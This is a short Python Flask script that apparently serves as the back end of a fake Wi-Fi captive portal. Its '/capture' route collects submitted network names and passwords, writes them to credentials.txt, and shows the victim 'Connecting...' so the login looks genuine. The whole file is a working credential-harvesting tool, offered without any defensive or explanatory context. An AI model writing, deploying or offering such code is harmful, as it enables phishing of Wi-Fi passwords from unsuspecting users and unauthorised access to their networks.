from flask import Flask, request

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    ssid = request.form.get('ssid')
    password = request.form.get('password')
    with open("credentials.txt", "a") as f:
        f.write(f"{ssid}:{password}\n")
    return "Connecting..."

app.run(host="0.0.0.0", port=80)